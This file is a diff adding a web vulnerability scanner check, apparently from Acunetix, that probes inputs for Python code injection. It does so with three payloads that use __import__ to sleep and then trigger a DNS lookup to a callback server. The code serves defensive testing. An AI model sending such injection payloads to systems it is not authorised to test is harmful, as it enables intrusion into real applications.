@@ -1,0 +1,109 @@
+
+
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+
+// class for testing for Python Code Evaluation
+function classPythonCodeEvaluation(scheme, inputIndex) {
+
+    this.scheme = scheme;
+    this.inputIndex = inputIndex;
+    this.variations = scheme.selectVariationsForInput(inputIndex);
+    this.currentVariation = 0;
+    this.foundVulnOnVariation = false;
+    this.lastJob = null;
+}
+
+classPythonCodeEvaluation.prototype.request = function (value) {
+    this.scheme.loadVariation(this.variations.item(this.currentVariation));
+    this.scheme.setInputValue(this.inputIndex, value);
+
+    this.lastJob = new THTTPJob();
+    this.lastJob.url = targetUrl;
+    scheme.populateRequest(this.lastJob);
+
+    this.lastJob.execute();
+
+    return !this.lastJob.wasError || this.lastJob.wasError && this.lastJob.hadTimedOut;
+};
+
+classPythonCodeEvaluation.prototype.alert = function (testValue, result, proof_title, proof_contents) {
+    this.foundVulnOnVariation = true;
+
+    var flags = ["verified", "acumonitor", "confidence.100"];
+    alertEx({
+        xml: "Python_Code_Injection.xml",
+        affects: this.scheme.path,
+        flags: flags,
+        job: this.lastJob,
+        detailsObject: {
+            input_type: this.scheme.getInputTypeStr(this.inputIndex),
+            input_name: this.scheme.getInputName(this.inputIndex),
+            proof_title: proof_title ? proof_title : false,
+            proof_contents: proof_contents ? proof_contents : false,
+            test_value: testValue,
+            result: result
+        },
+
+        addJob: false,
+        param: this.scheme.getInputName(this.inputIndex),
+        paramValue: testValue
+    });
+
+};
+
+classPythonCodeEvaluation.prototype.testInjection = function (value, rndToken) {
+    // replace random token from payload
+    value = value.replace("{{rndToken}}", rndToken);
+
+    // make the http request
+    if (!this.request(value)) return false;
+
+    // first make sure the request has generated a delay		
+    if (this.lastJob.responseDuration > 8900) {
+        // trace("sleep");
+        result = AcuMonitor_verifyInjectionDNS(rndToken, ["AAAA", "A"]);
+
+        // check acumonitor result
+        if (result) {
+            this.alert(value, result, "DNS lookup - " + rndToken + "." + AcuMonitor_AMServer, result);
+            return true;
+        }
+    }
+
+    return false;
+};
+
+classPythonCodeEvaluation.prototype.startTesting = function () {
+    for (var i = 0; i < this.variations.count; i++) {
+        // don't test further variations
+        if (this.foundVulnOnVariation) break;
+
+        // current variation
+        this.currentVariation = i;
+
+        // generate and sign bxss random token
+        var rndToken = AcuMonitor_signToken('hit' + randStrLC(10));
+
+        // list of tests
+        // no quotes
+        if (this.testInjection("str(__import__('time').sleep(9))+__import__('socket').gethostbyname('{{rndToken}}.'+'" + AcuMonitor_AMServer + "')", rndToken)) return true;
+        // single quotes
+        if (this.testInjection("'+str(__import__(\"time\").sleep(9))+__import__(\"socket\").gethostbyname(\"{{rndToken}}.\"+\"" + AcuMonitor_AMServer + "\")+'", rndToken)) return true;
+        // double quotes
+        if (this.testInjection("\"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('{{rndToken}}.'+'" + AcuMonitor_AMServer + "')+\"", rndToken)) return true;
+    }
+};
+
+// main entry point 
+if (ax.env.developer || AcuMonitor_checkAcumonitor()) {
+    for (var i = 0; i < scheme.inputCount; i++) {
+        var tester = new classPythonCodeEvaluation(scheme, i);
+        tester.startTesting();
+        ScriptProgress(ComputeProgress(i, scheme.inputCount));
+        tester = null;
+    }
+
+}
